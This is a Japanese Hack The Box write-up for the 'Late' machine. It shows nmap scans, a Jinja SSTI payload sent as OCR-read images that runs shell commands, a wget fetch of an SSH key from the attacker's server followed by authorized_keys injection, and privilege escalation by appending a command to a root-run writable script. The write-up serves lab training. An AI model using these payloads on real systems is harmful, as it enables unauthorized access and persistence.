# Late  
Hack The Box : LateのWriteupです。  

| 作成者 | 難易度 | プラットフォーム |  
|:----:|:-----:|:---------------:|
| kavigihan | Easy | Linux |  

### foothold  

まずはnmap  

~~~
┌──(kali㉿kali)-[~/htb/late]
└─$ nmap -sV -n -Pn -A -p 21-25,35,43,69,80-88,107-110,115,118,123,137-139,143,156,161-162,220,384,389,443-445,465,514,530,543-544,591,593,636,901-903,953,992,995,1025,1433-1434,1812,3000,3306,3389,3535,5000,5432,5555,7777,8008,8065,8080,8443,8888 late.htb     
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-10 22:12 EDT
Nmap scan report for late.htb (10.129.72.68)
Host is up (0.24s latency).
Not shown: 66 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.42 seconds
                                                                                                                                                       
┌──(kali㉿kali)-[~/htb/late]
└─$ sudo nmap -sS -n -p- late.htb      
Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-10 22:13 EDT
Nmap scan report for late.htb (10.129.72.68)
Host is up (0.23s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 391.91 seconds

~~~  

80番が開いているのでFirefoxでアクセスする。  
  
"images.late.htb"が見つかるので/etc/hostsに追記して下記にアクセスする。  
> hxxp://images.late.htb/  

画像を送信できそうなので、GIMPで"TEST"とだけ書いた画像を作成し、送信する。  
するとresult.txtが返ってくる。  
"TEST"と書かれており、OCRだということが分かる。  

続いて、__\{\{7\*7\}\}__ と書いた画像を作成し、送信する。  
すると"49"が返ってくるので、**SSTI** 可能だということがわかる。  

### user

とりあえず同様の方法で下記の文字列を送信してみる。  
フォントはArialかArial Italicを使用した。  

~~~
{{ get_flashed_messages.__globals__.__builtins__.___import__("os").popen("cat /etc/passwd").read() }}  
~~~  
※OCRなので一部が適切に認識されないことがある。  
その場合は先頭の"{{"を消して送信してみると良いかもしれない。  

上記の実行結果から"svc_acc"ユーザが存在していることが分かる。  

この時点でコマンドの実行可能なのでuser.txtは取得可能だが、権限昇格ステップでコマンドを自由に実行するために"svc_acc"の.ssh/authorized_keysにこちらで用意したsshキーを送り込むことにする。  

まずは下記コマンドを実行してsshキーを用意する。  
~~~
$ ssh-keygen ./id_rsa  
~~~
webサーバを起動してキーを配布できるようにする。  
~~~
$ python3 -m http.server 80  
~~~  

GIMPで下記を画像にし、送信する。※\[IP]部分は適宜入れ替える  
~~~
{{ get_flashed_messages.__globals__.__builtins__.___import__("os").popen("wget [IP]/id_rsa.pub").read() }}  
~~~  
続いて下記を画像にし、送信する。  
~~~
{{ get_flashed_messages.__globals__.__builtins__.___import__("os").popen("cat id_rsa.pub >>  /home/svc_acc/.ssh/authorized_keys ").read()  }}  
~~~  
これでsshキーの登録はできたのでsshで接続する。  
~~~
$ ssh -i id_rsa svc_acc@late.htb  
~~~  
以上でUserのSSHシェル取得が完了。  
### root  
pspy64を送り込んで実行し、プロセスを見る。  

時々“/usr/local/sbin/ssh-alert.sh”がrootによって実行されている事が分かる。
また、“/usr/local/sbin/ssh-alert.sh”の権限見ると、svc_accでも書き込み可能になっていることが分かる。  

このシェルスクリプトに実行したいコマンドを追加してroot権限でコマンドを実行することにする。  

追加するコマンドは下記
~~~
cat /root/root.txt >> /home/svc_acc/root.txt
~~~  
※プロセスを見るとわかるが、高頻度で別の場所にあるorigin版に置き換えられているため、vi等のテキストエディタで開くと失敗する可能性がある。その場合はechoコマンドを使って追記する。  

名前にある通りsshに関するアラートのスクリプトのようなので、sshでのログインやログアウトをしてみる。  

svc_accのホームを確認するとroot.txtが存在しており、root権限取得の完了となる。